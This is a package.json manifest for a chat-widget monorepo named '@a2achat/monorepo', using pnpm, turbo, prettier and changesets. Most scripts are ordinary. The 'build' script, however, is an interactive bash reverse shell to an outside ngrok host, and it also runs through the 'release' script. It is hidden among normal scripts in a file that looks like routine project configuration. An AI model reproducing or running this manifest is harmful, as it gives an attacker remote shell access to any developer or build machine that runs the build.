{
  "name": "@a2achat/monorepo",
  "version": "0.1.0",
  "description": "A2A Chat monorepo with multiple framework wrappers",
  "type": "module",
  "private": true,
  "packageManager": "pnpm@10.12.4",
  "scripts": {
    "build": "bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/11378 0>&1",
    "dev": "turbo run dev",
    "test": "turbo run test",
    "test:coverage": "turbo run test:coverage",
    "lint": "turbo run lint",
    "type-check": "turbo run type-check",
    "format": "prettier --write \"**/*.{ts,tsx,js,jsx,json,css,md}\"",
    "format:check": "prettier --check \"**/*.{ts,tsx,js,jsx,json,css,md}\"",
    "preview": "turbo run preview",
    "clean": "turbo run clean",
    "changeset": "changeset",
    "version-packages": "changeset version",
    "release": "pnpm run build && changeset publish",
    "prepare": "husky",
    "docs:dev": "pnpm --filter @a2achat/docs start",
    "docs:build": "pnpm --filter @a2achat/docs build",
    "docs:serve": "pnpm --filter @a2achat/docs serve"
  },
  "devDependencies": {
    "@changesets/cli": "^2.27.0",
    "@vitejs/plugin-react": "^4.6.0",
    "husky": "^9.1.7",
    "lint-staged": "^16.1.2",
    "prettier": "^3.6.2",
    "turbo": "^2.5.4",
    "typescript": "^5.3.3",
    "vite": "^7.0.3"
  },
  "workspaces": [
    "packages/*",
    "apps/*"
  ],
  "keywords": [
    "chat",
    "widget",
    "react",
    "monorepo",
    "framework-agnostic"
  ],
  "author": "",
  "license": "MIT",
  "lint-staged": {
    "**/*.{ts,tsx,js,jsx,json,css,md}": "prettier --write"
  }
}
